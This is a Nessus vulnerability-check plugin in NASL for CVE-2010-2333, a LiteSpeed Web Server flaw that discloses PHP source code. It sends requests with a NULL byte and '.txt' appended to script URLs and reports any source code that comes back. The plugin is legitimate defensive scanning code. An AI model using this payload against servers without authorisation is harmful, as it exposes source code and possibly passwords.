#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(48246);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2016/10/27 15:03:54 $");

  script_cve_id("CVE-2010-2333");
  script_bugtraq_id(40815);
  script_osvdb_id(65476);
  script_xref(name:"Secunia", value:"40128");

  script_name(english:"LiteSpeed Web Server Source Code Information Disclosure");
  script_summary(english:"Tries to read the source of a PHP script");
 
  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server is affected by a source code disclosure
vulnerability."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The installed version of the LiteSpeed web server software on the
remote host returns the source of scripts hosted on it when a NULL
byte and '.txt' is appended to the request URL. 

A remote attacker may be able to leverage this issue to view a file on
the web server's source code and possibly obtain passwords and other
sensitive information from this host."
  );

  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2010/Jun/288");
  script_set_attribute(attribute:"see_also", value:"http://www.litespeedtech.com/litespeed-web-server-release-log.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to LiteSpeed version 4.0.15 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2010/06/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/06/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/08/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php:TRUE);

# Unless we're paranoid, make sure the banner looks like LiteSpeed.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner) exit(1, "get_http_banner() returned NULL for port "+port+".");
  if ("Server: LiteSpeed" >!< banner) exit(0, "The Server response header is not from it's not LiteSpeed.");
}


# NB: check a couple of files in case some don't contain any PHP code
#     or include it in the generated output.
max_files = 5;
open_tag_pat = '<(\\?(php)? |% |script +language="php">)';
close_tag_pat = '(\\?|%|</script)>';

files = get_kb_list("www/"+port+"/content/extensions/php");
if (isnull(files)) files = make_list("/index.php");
else files = make_list(files);

n = 0;
foreach file (files)
{
  ++n;

  # Try to exploit the issue.
  payload = '\x00.txt';
  url = file + payload;

  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  # If it looks like source...
  if (
    "Content-Type: text/plain" >< res[1] &&
    res[2] && 
    egrep(pattern:open_tag_pat, string:res[2]) &&
    egrep(pattern:close_tag_pat, string:res[2])
  )
  {
    # Make sure it's not normally there.
    res2 = http_send_recv3(method:"GET", item:file, port:port, exit_on_fail:TRUE);
    if (
      res[2] && 
      !egrep(pattern:open_tag_pat, string:res2[2]) &&
      # nb: don't worry about '</script>' in regular response.
      !egrep(pattern:close_tag_pat-'|</script', string:res2[2])
    )
    {
      if (report_verbosity > 0)
      {
        report = 
          '\n' + "Nessus was able to retrieve the source of '" + file + "' using" +
          '\na specially crafted URL.\n';
        if (report_verbosity > 1)
        {
          report += '\nHere it is :\n' +
            crap(data:"-", length:30) + snip + crap(data:"-", length:30) + '\n' +
             res[2] +
            crap(data:"-", length:30) + snip + crap(data:"-", length:30) + '\n';
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
  if (n > max_files) break;
}
exit(0, "The web server listening on port "+port+" does not seem to be affected.");
